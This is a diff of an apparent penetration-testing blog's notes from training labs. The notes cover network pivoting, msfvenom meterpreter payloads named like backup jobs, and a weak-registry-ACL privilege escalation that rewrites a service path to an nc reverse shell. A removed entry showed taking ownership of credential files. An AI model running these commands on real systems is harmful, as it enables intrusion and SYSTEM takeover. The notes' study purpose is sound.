+<h5 id="Client-pivot-machine-n-1"><a href="#Client-pivot-machine-n-1" class="headerlink" title="Client (pivot machine - n+1)"></a>Client (pivot machine - n+1)</h5><p>Transfer rpivot to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r rpivot username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Run client:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2.7 client.py --server-ip n --server-port Listener-port</span><br></pre></td></tr></table></figure>
+
+<p>Then </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains firefox-esr 172.16.5.135:80</span><br></pre></td></tr></table></figure>
+<p>or </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">proxychains curl http://172.16.5.135/</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><p>Transfer chisel to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Server ( n+1 )</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel server -v -p listener-port --socks5</span><br></pre></td></tr></table></figure>
+
+
+<p>Client ( n )</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client -v machine-n+1:listener-port socks</span><br></pre></td></tr></table></figure>
+
+<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
+<h4 id="Chisel-Reverse-Pivot"><a href="#Chisel-Reverse-Pivot" class="headerlink" title="Chisel Reverse Pivot"></a>Chisel Reverse Pivot</h4><p>Server ( n )</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ./chisel server --reverse -v -p listening-port --socks5</span><br></pre></td></tr></table></figure>
+
+<p>Transfer chisel to n+1 machine:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">scp -r chisel username@n+1:/home/username/</span><br></pre></td></tr></table></figure>
+
+<p>Client ( n+1 )</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./chisel client -v machine-n:listening-port R:socks</span><br></pre></td></tr></table></figure>
+
+<p>➜ We should use <code>socks5 127.0.0.1 1080</code> in &#x2F;etc&#x2F;proxychains.conf.</p>
+<h4 id="Configure-Proxychains-n"><a href="#Configure-Proxychains-n" class="headerlink" title="Configure Proxychains (n)"></a>Configure Proxychains (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/proxychains.conf  </span><br><span class="line"></span><br><span class="line">socks4 127.0.0.1 Local-proxy-port</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Without-Proxychains"><a href="#Without-Proxychains" class="headerlink" title="Without Proxychains"></a>Without Proxychains</h3><h4 id="sshuttle-n"><a href="#sshuttle-n" class="headerlink" title="sshuttle (n)"></a>sshuttle (n)</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> sshuttle -r username@n+1 internal_network_@/mask -v</span><br></pre></td></tr></table></figure>
+
+<p>➜ Automatically handles traffic forwarding without needing Proxychains. </p>
+<p>➜ Works <em>only</em> for SSH-based pivoting (no TOR&#x2F;HTTPS proxy support).</p>
+<p>Example</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:172.16.5.19 /u:victor /p:<span class="string">&#x27;pass@123&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h4 id="plink-exe-n"><a href="#plink-exe-n" class="headerlink" title="plink.exe (n)"></a>plink.exe (n)</h4><h5 id="SSH-Dynamic-SOCKS-Proxy"><a href="#SSH-Dynamic-SOCKS-Proxy" class="headerlink" title="SSH Dynamic SOCKS Proxy"></a>SSH Dynamic SOCKS Proxy</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">plink -ssh -D Local-proxy-port username@n+<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="Proxy-Handling-Windows"><a href="#Proxy-Handling-Windows" class="headerlink" title="Proxy Handling (Windows)"></a>Proxy Handling (Windows)</h5><p>Use <strong>Proxifier</strong> to route selected tools through the proxy:</p>
+<p><img src="/img/proxifier.png" alt="Proxifier"></p>
+<p>➜ After configuration, any selected tool will have its traffic forwarded automatically.</p>
+<h1 id="Reverse-Port-Forwarding-Reverse-Bind-Shell"><a href="#Reverse-Port-Forwarding-Reverse-Bind-Shell" class="headerlink" title="Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )"></a>Reverse Port Forwarding ( Reverse &#x2F; Bind Shell )</h1><h2 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h2><h3 id="Reverse-Shell-Preparation-Payload-Listener-Setup"><a href="#Reverse-Shell-Preparation-Payload-Listener-Setup" class="headerlink" title="Reverse Shell Preparation (Payload + Listener Setup)"></a>Reverse Shell Preparation (Payload + Listener Setup)</h3><p>Create Reverse Shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https lhost=&lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=&lt;Internal-listener-Port-on-n+1&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p> Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT &lt;listener-Port-on-n&gt; </span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 0.0.0.0 </span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-1-→-n" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n+1 → n )"></a>Creating the Reverse Port Forwarding Tunnel ( n+1 → n )</h3><h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -R Internal-IP-of-PivotHost-n+1:&lt;Internal-listener-Port-on-n+1&gt;:0.0.0.0:&lt;listener-Port-on-n&gt; username@n+1 -vN</span><br></pre></td></tr></table></figure>
+
+<h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd add -R -l &lt;listener-Port-on-n&gt; -p &lt;Internal-listener-Port-on-n+1&gt; -L IP-of-n-machine</span><br></pre></td></tr></table></figure>
+
+<h4 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a>Socat</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:&lt;Internal-listener-Port-on-n+1&gt;,fork TCP4:IP-of-n-machine:&lt;listener-Port-on-n&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Execute-Reverse-Shell"><a href="#Execute-Reverse-Shell" class="headerlink" title="Execute Reverse Shell"></a>Execute Reverse Shell</h3><p>Once you execute <code>backupscript.exe</code> on Windows (n+2), we receive a shell from Windows pivoted via the Ubuntu server :</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2336 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows [Version 10.0.17763.1637]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="Bind-Shell-Preparation-Payload-Bind-Setup"><a href="#Bind-Shell-Preparation-Payload-Bind-Setup" class="headerlink" title="Bind Shell Preparation (Payload + Bind Setup)"></a>Bind Shell Preparation (Payload + Bind Setup)</h3><p>Create Bind Shell</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+
+<p> Configuring &amp; Starting multi&#x2F;handler</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> RHOST n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LPORT Bind-port-on-n+1</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<h3 id="Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1"><a href="#Creating-the-Reverse-Port-Forwarding-Tunnel-n-→-n-1" class="headerlink" title="Creating the Reverse Port Forwarding Tunnel ( n → n+1 )"></a>Creating the Reverse Port Forwarding Tunnel ( n → n+1 )</h3><h6 id="Socat-1"><a href="#Socat-1" class="headerlink" title="Socat"></a>Socat</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">socat TCP4-LISTEN:Bind-port-on-n+1,fork TCP4:n+2-machine:Listener-port-on-n+2</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Execute-Bind-Shell"><a href="#Execute-Bind-Shell" class="headerlink" title="Execute Bind Shell"></a>Execute Bind Shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: INLANEFREIGHT\victor</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Active Directory</category>
+        <category>Linux</category>
+        <category>Pivoting And Port Forwarding</category>
+      </categories>
+      <tags>
+        <tag>Local-Port-Forwarding</tag>
+        <tag>Dynamic-Port-Forwarding</tag>
+        <tag>Proxychains</tag>
+        <tag>Rpivot</tag>
+        <tag>sshuttle</tag>
+        <tag>plink</tag>
+        <tag>Proxifier</tag>
+        <tag>socat</tag>
+        <tag>Reverse-Port-Forwarding</tag>
+        <tag>Chisel</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weak Registry ACLs</title>
+    <url>/2026/06/19/Weak-Registry-ACLs/</url>
     <content><![CDATA[<blockquote>
-<p>➜ SeTakeOwnershipPrivilege lets a user become the owner of any protected Windows object (files, registry keys, services, or AD objects), which enables full access through the sequence : </p>
+<p>➜ Weak Registry ACLs occur when a low-privileged user has write or full control permissions over a service registry key, allowing them to modify critical values such as <code>ImagePath</code>. This allows an attacker to change the service executable to a malicious binary and execute a malicious binary with SYSTEM privileges.</p>
 </blockquote>
-<ul>
-<li><code>Take Ownership → Modify The DACL (ACL) → Gain Full Access</code></li>
-</ul>
-<blockquote>
-<p>➜ This can lead us to : </p>
+<h3 id="Enumerating-Weak-Registry-Permissions"><a href="#Enumerating-Weak-Registry-Permissions" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h3><blockquote>
+<p>We can use AccessChk to identify services with weak registry permissions:</p>
 </blockquote>
-<ol>
-<li><p>Read protected files  </p>
-<p> Take ownership → change ACL → read sensitive files (creds, keys, flags).</p>
-</li>
-<li><p>Privilege escalation &#x2F; RCE  </p>
-<p> Take ownership of a config&#x2F;script used by a privileged service → modify it → code runs as SYSTEM&#x2F;service account.</p>
-</li>
-<li><p>Denial of Service (DoS) </p>
-<p> Take ownership → break ACLs on critical files → service&#x2F;app stops working.</p>
-</li>
-<li><p>GPO → ownership abuse (domain)</p>
-<p> Abuse GPO to grant the privilege <code>SeTakeOwnershipPrivilege</code> → then do any of the above on file shares or systems.</p>
-</li>
-</ol>
-<h4 id="Enabling-SeTakeOwnershipPrivilege"><a href="#Enabling-SeTakeOwnershipPrivilege" class="headerlink" title="Enabling SeTakeOwnershipPrivilege"></a>Enabling SeTakeOwnershipPrivilege</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                                              State</span><br><span class="line">============================= ======================================================= ========</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects                Disabled</span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; \<span class="title">ccesschk.exe</span> /<span class="title">accepteula</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; -<span class="title">kvuqsw</span> <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">BTAGService</span>\<span class="title">Parameters</span>\<span class="title">Settings</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEYa</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt; </span></span><br></pre></td></tr></table></figure>
 
 <blockquote>
-<p>➜ In some cases, the privilege is present but disabled by default. It can be enabled at runtime by adjusting the process token using this PowerShell <a href="https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1">script</a>.</p>
+<p>➜ This means the current user has full control over the <code>ModelManagerService</code> registry key.</p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\htb&gt; <span class="built_in">Import-Module</span> .\<span class="built_in">Enable-Privilege</span>.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; .\EnableAllTokenPrivs.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\htb&gt; whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="literal">----------------------</span></span><br><span class="line">Privilege Name                Description                              State</span><br><span class="line">============================= ======================================== =======</span><br><span class="line">SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled</span><br></pre></td></tr></table></figure>
+<h3 id="Modifying-the-Service-ImagePath"><a href="#Modifying-the-Service-ImagePath" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h3><blockquote>
+<p>Since we have write access, we can change the service executable path to a malicious binary:</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS&gt; Set-ItemProperty -Path &quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;ServiceName&gt;&quot; -Name ImagePath -Value &quot;C:\path\to\nc.exe -e cmd.exe &lt;our-ip&gt; &lt;our-port&gt;&quot;</span><br></pre></td></tr></table></figure>
 
-<h4 id="Checking-File-Ownership"><a href="#Checking-File-Ownership" class="headerlink" title="Checking File Ownership"></a>Checking File Ownership</h4><p>Check out the owner of the IT directory.</p>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; cmd /c <span class="built_in">dir</span> /q <span class="string">&#x27;C:\Department Shares\Private\IT&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">22</span> PM    &lt;<span class="built_in">DIR</span>&gt;          WINLPE<span class="literal">-SRV01</span>\sccm_svc  ..</span><br><span class="line"><span class="number">06</span>/<span class="number">18</span>/<span class="number">2021</span>  <span class="number">12</span>:<span class="number">23</span> PM                <span class="number">36</span> ...                    cred.txt</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>This modifies the service configuration to execute our malicious binary.</p>
+</blockquote>
+<h2 id="Restarting-the-Service"><a href="#Restarting-the-Service" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h2><p>Restart the service to execute the malicious binary:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sc.exe stop &lt;ServiceName&gt;</span><br><span class="line">sc.exe <span class="built_in">start</span> &lt;ServiceName&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Get-Reverse-Shell"><a href="#Get-Reverse-Shell" class="headerlink" title="Get Reverse Shell"></a>Get Reverse Shell</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜ rlwrap nc -lvnp our-port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 
 
 <blockquote>
-<p>➜  IT share appears to be owned by a service account <code>sccm_svc</code>.</p>
+<p>➜ Weak Registry ACLs occur when a low-privileged user has <code>write</code> or <code>full control</code> permissions over a service’s registry key, allowing them to modify critical values such as <code>ImagePath</code>. By pointing <code>ImagePath</code> at a malicious binary and restarting the service, an attacker executes code under the service’s account, typically <code>SYSTEM</code>.</p>
 </blockquote>
-<h4 id="Taking-Ownership-of-the-File"><a href="#Taking-Ownership-of-the-File" class="headerlink" title="Taking Ownership of the File"></a>Taking Ownership of the File</h4><blockquote>
-<p>➜ Now we can use the <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown">takeown</a> Windows binary to change ownership of the file.</p>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerating-Weak-Registry-Permissions-1"><a href="#Enumerating-Weak-Registry-Permissions-1" class="headerlink" title="Enumerating Weak Registry Permissions"></a>Enumerating Weak Registry Permissions</h4><blockquote>
+<p>➜ We use AccessChk to recurse the services hive and list keys our user can write to. The <code>ImagePath</code> value lives directly under the service root key, so what we need is <code>KEY_SET_VALUE</code> on <code>HKLM\System\CurrentControlSet\services\&lt;service-name&gt;</code> itself</p>
 </blockquote>
-<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; takeown /f <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">C:\&gt; .\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">kvuqsw</span> &quot;&lt;<span class="title">our</span>-<span class="title">user</span>&gt;&quot; <span class="title">hklm</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\&lt;<span class="title">service</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="function">        <span class="title">KEY_QUERY_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_SET_VALUE</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_CREATE_SUB_KEY</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ENUMERATE_SUB_KEYS</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_NOTIFY</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="Confirming-Ownership-Changed"><a href="#Confirming-Ownership-Changed" class="headerlink" title="Confirming Ownership Changed"></a>Confirming Ownership Changed</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ChildItem</span> <span class="literal">-Path</span> <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> | <span class="built_in">select</span> name,directory, <span class="selector-tag">@</span>&#123;Name=<span class="string">&quot;Owner&quot;</span>;Expression=&#123;(<span class="built_in">Get-ACL</span> <span class="variable">$_</span>.Fullname).Owner&#125;&#125;</span><br><span class="line"> </span><br><span class="line">Name            Directory                            Owner</span><br><span class="line">cred.txt        C:\Department Shares\Private\IT      WINLPE<span class="literal">-SRV01</span>\htb<span class="literal">-student</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file"><a href="#Modifying-the-File-ACL-Grant-Ourself-full-privileges-over-the-target-file" class="headerlink" title="Modifying the File ACL ( Grant Ourself full privileges over the target file )"></a>Modifying the File ACL ( Grant Ourself full privileges over the target file )</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; icacls <span class="string">&#x27;C:\Department Shares\Private\IT\cred.txt&#x27;</span> /grant htb<span class="literal">-student</span>:F</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>➜ Now we can () modify, read, etc ) the file.</p>
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><blockquote>
+<p>➜ We confirm the service runs as <code>LocalSystem</code> with <code>sc qc</code>, this is what makes the payload execute as <code>SYSTEM</code>.</p>
 </blockquote>
-<h4 id="Interesting-Files-To-Check"><a href="#Interesting-Files-To-Check" class="headerlink" title="Interesting Files To Check"></a>Interesting Files To Check</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\inetpub\wwwwroot\web.config</span><br><span class="line">%WINDIR%\repair\sam</span><br><span class="line">%WINDIR%\repair\system</span><br><span class="line">%WINDIR%\repair\software, %WINDIR%\repair\security</span><br><span class="line">%WINDIR%\system32\config\SecEvent.Evt</span><br><span class="line">%WINDIR%\system32\config\default.sav</span><br><span class="line">%WINDIR%\system32\config\security.sav</span><br><span class="line">%WINDIR%\system32\config\software.sav</span><br><span class="line">%WINDIR%\system32\config\system.sav</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe qc &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"></span><br><span class="line">[<span class="type">SC</span>] QueryServiceConfig SUCCESS</span><br><span class="line"></span><br><span class="line">    SERVICE_NAME: &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line">    <span class="built_in">TYPE</span>               : <span class="number">10</span>  WIN32_OWN_PROCESS</span><br><span class="line">    START_TYPE         : <span class="number">2</span>   AUTO_START</span><br><span class="line">    BINARY_PATH_NAME   : <span class="string">&quot;C:\Program Files\&lt;service-name&gt;\&lt;service-name&gt;.exe&quot;</span></span><br><span class="line">    SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
+
+<h1 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h1><h4 id="Modifying-the-Service-ImagePath-1"><a href="#Modifying-the-Service-ImagePath-1" class="headerlink" title="Modifying the Service ImagePath"></a>Modifying the Service ImagePath</h4><blockquote>
+<p>➜ Since we can write to the service key, we overwrite <code>ImagePath</code> to point at our payload. <code>nc.exe</code> must already be staged on disk at the path we reference.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Services\&lt;service-name&gt;&quot;</span> <span class="literal">-Name</span> ImagePath <span class="literal">-Value</span> <span class="string">&quot;C:\Windows\Temp\nc.exe -e cmd.exe ip port&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Starting-the-Listener"><a href="#Starting-the-Listener" class="headerlink" title="Starting the Listener"></a>Starting the Listener</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp port</span><br></pre></td></tr></table></figure>
+
+<h4 id="Restarting-the-Service-1"><a href="#Restarting-the-Service-1" class="headerlink" title="Restarting the Service"></a>Restarting the Service</h4><blockquote>
+<p>➜ Restarting forces the service to launch our new <code>ImagePath</code> and this needs <code>SERVICE_STOP</code> and <code>SERVICE_START</code> over the service (or a reboot). A raw <code>nc</code> payload isn’t service-aware, so the SCM will time out after ~30 seconds and report a start failure, that’s expected and the shell fires regardless.</p>
+</blockquote>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe stop &lt;service<span class="literal">-name</span>&gt;</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; sc.exe <span class="built_in">start</span> &lt;service<span class="literal">-name</span>&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Getting-a-SYSTEM-Shell"><a href="#Getting-a-SYSTEM-Shell" class="headerlink" title="Getting a SYSTEM Shell"></a>Getting a SYSTEM Shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  weak-registry rlwrap nc -lvnp port</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt; <span class="built_in">whoami</span></span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>]]></content>
       <categories>
         <category>Active Directory</category>
         <category>Windows</category>
         <category>Post-Exploitation</category>
         <category>Windows Privesc</category>
-        <category>User</category>
+        <category>Services</category>
       </categories>
+      <tags>
+        <tag>Weak-ACL</tag>
+        <tag>AccessChk</tag>
+        <tag>sc.exe</tag>
+        <tag>Windows-Services</tag>
+        <tag>Weak-Registry-ACLs</tag>
+        <tag>Modifiable-Registry-Key</tag>
+        <tag>Registry-Permissions</tag>
+        <tag>ImagePath</tag>
+        <tag>KEY_SET_VALUE</tag>
+        <tag>Set-ItemProperty</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Weak Service Permissions</title>
+    <url>/2026/06/16/Weak-Service-Permissions/</url>
+    <content><![CDATA[<blockquote>
+<p>➜ Weak Service Permissions occur when a low-privileged user has excessive permissions over a service object ( SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS), allowing them to modify the service configuration such as the binary path and execute arbitrary code as SYSTEM.</p>
+</blockquote>
+<h1 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h1><h4 id="Enumerates-Modifiable-Service’configuration"><a href="#Enumerates-Modifiable-Service’configuration" class="headerlink" title="Enumerates Modifiable Service’configuration"></a>Enumerates Modifiable Service’configuration</h4><p> &gt;➜ As we can see SharpUp identified that configuration of <code>WindscribeService.exe</code> is Modifiable</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpUp.exe audit</span><br><span class="line"></span><br><span class="line">=== Modifiable Services ===</span><br><span class="line"></span><br><span class="line">  Name             : WindscribeService</span><br><span class="line">  DisplayName      : WindscribeService</span><br><span class="line">  Description      : Manages the firewall and controls the VPN tunnel</span><br><span class="line">  State            : Running</span><br><span class="line">  StartMode        : Auto</span><br><span class="line">  PathName         : <span class="string">&quot;C:\Program Files (x86)\Windscribe\WindscribeService.exe&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-the-Service-Account"><a href="#Checking-the-Service-Account" class="headerlink" title="Checking the Service Account"></a>Checking the Service Account</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\&gt; sc.exe qc WindscribeService  </span><br><span class="line">  </span><br><span class="line">[SC] QueryServiceConfig SUCCESS  </span><br><span class="line">  </span><br><span class="line">	SERVICE_NAME: WindscribeService  </span><br><span class="line">	TYPE : 10 WIN32_OWN_PROCESS  </span><br><span class="line">	START_TYPE : 2 AUTO_START  </span><br><span class="line">	BINARY_PATH_NAME : C:\Program Files (x86)\Windscribe\WindscribeService.exe  </span><br><span class="line">	SERVICE_START_NAME : LocalSystem</span><br></pre></td></tr></table></figure>
+
+<h4 id="Checking-Permissions-with-AccessChk"><a href="#Checking-Permissions-with-AccessChk" class="headerlink" title="Checking Permissions with AccessChk"></a>Checking Permissions with AccessChk</h4><p> &gt;➜ We can see that all Authenticated Users have <a href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">SERVICE_ALL_ACCESS</a> rights over the service, which means full read&#x2F;write control over it.</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\accesschk.exe /accepteula <span class="literal">-quvcw</span> WindscribeService</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WindscribeService</span><br><span class="line">  Medium Mandatory Level (Default) [<span class="type">No</span>-<span class="built_in">Write-Up</span>]</span><br><span class="line"></span><br><span class="line">  RW NT AUTHORITY\Authenticated Users</span><br><span class="line">        SERVICE_ALL_ACCESS</span><br></pre></td></tr></table></figure>
+
+
